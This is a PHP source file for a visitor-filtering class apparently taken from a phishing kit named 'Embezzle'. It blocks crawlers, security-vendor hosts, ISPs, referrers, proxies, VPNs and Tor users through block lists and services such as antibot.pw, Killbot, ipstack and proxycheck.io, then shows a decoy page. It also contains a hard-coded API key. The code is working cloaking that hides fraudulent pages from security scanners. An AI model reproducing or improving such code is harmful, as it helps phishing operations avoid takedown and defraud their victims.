<?php

namespace Embezzle\Libraries;

use Jaybizzle\CrawlerDetect\CrawlerDetect;
use Embezzle\Libraries\Handler;

class Bots
{

    private $bots_path;
    private $bots_ext;
    private $handler;
    private $crawler;
    public function __construct()
    {
        $this->bots_path = dirname(__DIR__) . '/bots/';
        $this->bots_ext = '.bot';
        $this->handler = new Handler;
        $this->crawler = new CrawlerDetect;
    }
    public function parse_bots($files)
    {
        if (file_exists($this->bots_path . $files . $this->bots_ext)) {
            $data = explode("\n", str_replace("\r", "", file_get_contents($this->bots_path . $files . $this->bots_ext)));
        } else {
            return false;
        }
        return $data;
    }
    public function blocked_page()
    {
        echo file_get_contents(CORE_PATH . 'html/'  . CONFIG['app']['blocked_page'] . '.html');
        exit;
    }
    public function logbot($log, $data = [])
    {
        $fp = fopen(PUBLIC_PATH . 'logs/' . $log . '.log', 'a');
        fwrite($fp, implode("|", $data) . "\n");
        fclose($fp);
    }
    public function log($type, $data)
    {
        $handler = $this->handler->detection();
        $data = [
            'type' => $type,
            'blocked' => $data,
            'hostname' => $handler['hostname'],
            'useragent' => $handler['useragent'],
            'userip' => $handler['userip'],
            'platform' => $handler['platform'],
            'browser' => $handler['browser']
        ];
        return $this->logbot('block', $data);
    }
    public function bad_word($word)
    {
        foreach ($this->parse_bots('badword') as $bad) {
            if (@preg_match("/" . $bad . "/", $word)) {
                $this->log('badword', $word);
                $_SESSION['block'] = true;
            }
        }

        return $word;
    }
    public function bot_host()
    {
        $hostname = $this->handler->detection()['hostname'];

        foreach ($this->parse_bots('host') as $host) {
            if (@preg_match("/" . $host . "/", $hostname)) {
                $this->log('hostname', $host);
                $_SESSION['block'] = true;
            }
        }

        return;
    }
    public function bot_reff()
    {

        if (isset($_SERVER['HTTP_REFERER'])) {

            $reff = $_SERVER['HTTP_REFERER'];

            foreach ($this->parse_bots('domain') as $domain) {
                if (@preg_match("/" . $domain . "/", $reff)) {
                    $this->log('referer', $reff);
                    $_SESSION['block'] = true;
                }
            }
        }
        return;
    }

    public function bot_agent()
    {
        $agents = $this->handler->detection()['useragent'];
        foreach ($this->parse_bots('agent') as $agent) {
            if (strpos(strtolower($agents), strtolower($agent)) !== false) {
                $this->log('useragent', $agent);
                $_SESSION['block'] = true;
            } elseif (@substr_count(strtolower($agent), strtolower($agents)) > 0) {
                $this->log('useragent', $agent);
                $_SERVER['block'] = true;
            }
        }

        return;
    }
    public function bot_ip()
    {
        $ips  = $this->handler->detection()['userip'];
        foreach ($this->parse_bots('ip') as $ip) {
            if (@preg_match("/" . $ip . "/", $ips)) {
                $this->log('ip', $ip);
                $_SESSION['block'] = true;
            }
        }
    }
    public function bot_isp()
    {
        if (isset($_SESSION['api']['isp'])) {
            foreach ($this->parse_bots('isp') as $isp) {
                if (strpos(strtolower($_SESSION['api']['isp']), strtolower($isp)) !== false) {
                    $this->log('isp', $isp);
                    $_SESSION['block'] = true;
                }
                if (substr_count(strtolower($_SESSION['api']['isp']), strtolower($isp)) > 0) {
                    $this->log('isp', $isp);
                    $_SESSION['block'] = true;
                }
            }
        }
    }
    public function bot_crawlers()
    {
        $agents = $this->handler->detection()['useragent'];
        foreach ($this->parse_bots('Crawlers') as $agent) {
            if (strpos(strtolower($agents), strtolower($agent)) !== false) {
                $this->log('crawlers', $agent);
                $_SESSION['block'] = true;
            } elseif (@substr_count(strtolower($agent), strtolower($agents) > 0)) {
                $this->log('crawlers', $agent);
                $_SERVER['block'] = true;
            }
        }
    }

    public function ipstackGet($module, $key)
    {

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_URL, "http://api.ipstack.com/" . $this->handler->detection()['userip'] . "?access_key=" . $key . "&" . $module . "=1");
        $data = curl_exec($ch);
        curl_close($ch);
        $json = json_decode($data, true);
        return $json;
    }
    public function ipstack($key)
    {

        $emzu = $this->ipstackGet('security', $key);
        if (is_array(@$emzu['security'])) {
            $is_bot = @$emzu['security'];
            if ($is_bot['is_proxy'] == true || $is_bot['is_crawler'] == true || $is_bot['is_tor'] == true) {
                $this->log('ipstack', $this->handler->detection()['userip']);
                $_SESSION['block'] = true;
            }
        }
    }
    public function antibot()
    {

        if ($_SESSION['antibot_wasChecked'] == false || !isset($_SESSION['antibot_wasChecked'])) {

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_USERAGENT, "Antibot Blocker");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, "https://antibot.pw/api/v2-blockers?ip=" . $this->handler->detection()['userip'] . "&apikey=" . CONFIG['app']['antibot'] . "&ua=" . urlencode($_SERVER['HTTP_USER_AGENT']));
            $data = curl_exec($ch);
            curl_close($ch);

            $_SESSION['antibot_wasChecked'] = true;

            $x = json_decode($data, true);
            if ($x['is_bot']) {

                $_SESSION['is_bot']  = true;

                $this->log('antibot', $this->handler->detection()['userip']);
                $_SESSION['block'] = true;

                exit;
            } else {
                $_SESSION['is_bot']  = false;
            }
        }

        if ($_SESSION['is_bot'] == true) {
            $_SESSION['block'] = true;
        }
    }
    public function block_proxy()
    {

        $ip = $this->handler->detection()['userip'];
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://v2.api.iphub.info/guest/ip/$ip");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        if (curl_errno($ch)) {
            echo 'Error:' . curl_error($ch);
        }
        curl_close($ch);
        $json = json_decode($result, true);
        $vpn = $json["block"];

        if ($vpn == 1) {
            $this->log('proxy', $ip);
            $_SESSION['block'] = true;
        }
    }
    public function proxycheck_function($Visitor_IP)
    {

        // ------------------------------
        // SETTINGS
        // ------------------------------

        $API_Key = "47835r-7876b8-823533-s17802";
        $VPN = "0";
        $TLS = "0";
        $TAG = "1";

        // If you would like to tag this traffic with a specific description place it between the quotes.
        // Without a custom tag entered below the domain and page url will be automatically used instead.
        $Custom_Tag = "Embezzle@Component";

        // ------------------------------
        // END OF SETTINGS
        // ------------------------------

        // Setup the correct querying string for the transport security selected.
        if ($TLS == 1) {
            $Transport_Type_String = "https://";
        } else {
            $Transport_Type_String = "http://";
        }

        // By default the tag used is your querying domain and the webpage being accessed
        // However you can supply your own descriptive tag or disable tagging altogether above.
        if ($TAG == 1 && $Custom_Tag == "") {
            $Post_Field = "tag=" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
        } else if ($TAG == 1 && $Custom_Tag != "") {
            $Post_Field = "tag=" . $Custom_Tag;
        } else {
            $Post_Field = "";
        }

        // Performing the API query to proxycheck.io/v2/ using cURL
        $ch = curl_init($Transport_Type_String . 'proxycheck.io/v2/' . $Visitor_IP . '?key=' . $API_Key . '&vpn=' . $VPN);

        $curl_options = array(
            CURLOPT_CONNECTTIMEOUT => 30,
            CURLOPT_POST => 1,
            CURLOPT_POSTFIELDS => $Post_Field,
            CURLOPT_RETURNTRANSFER => true
        );

        curl_setopt_array($ch, $curl_options);
        $API_JSON_Result = curl_exec($ch);
        curl_close($ch);

        // Decode the JSON from our API
        $Decoded_JSON = json_decode($API_JSON_Result);

        // Check if the IP we're testing is a proxy server
        if (isset($Decoded_JSON->$Visitor_IP->proxy) && $Decoded_JSON->$Visitor_IP->proxy == "yes") {

            // A proxy has been detected.
            return true;
        } else {

            // No proxy has been detected.
            return false;
        }
    }
    public function init($config = [])
    {

        // Pass a user agent as a string
        if ($this->crawler->isCrawler($_SERVER['HTTP_USER_AGENT'])) {
            $this->log('crawler', $this->handler->detection()['useragent']);
            $_SESSION['block'] = true;
        }
        $this->bot_reff();

        if ($config['ip'] == 1 || $config['ip'] == true) {
            $this->bot_ip();
        }
        if ($config['agent'] == 1 || $config['agent'] == true) {
            $this->bot_agent();
        }
        if ($config['host'] == 1 || $config['host'] == true) {
            $this->bot_host();
        }
        if ($config['proxy'] == 1 || $config['proxy'] == true) {
            if ($this->proxycheck_function($this->handler->detection()['userip'])) {
                $this->log('proxy', $this->handler->detection()['userip']);
                $_SESSION['block'] = true;
            }
        }

        if ($config['killbot'] != '') {
            $Killbot = new Killbot([
                'active'        => true, // If 'true' will set blocker protection active, and 'false' will deactive protection
                'apikey'        => $config['killbot'], // Your API Key from https://killbot.pw/developer
                'bot_redirect'  => 'https://httpstatuses.com/' // Bot will be redirect to this URL
            ]);
            $Killbot->run();
        }
        if ($config['antibot'] != '') {
            $this->antibot();
        }

        if ($config['ipstack'] != '') {
            $this->ipstack($config['ipstack']);
        }
    }
}
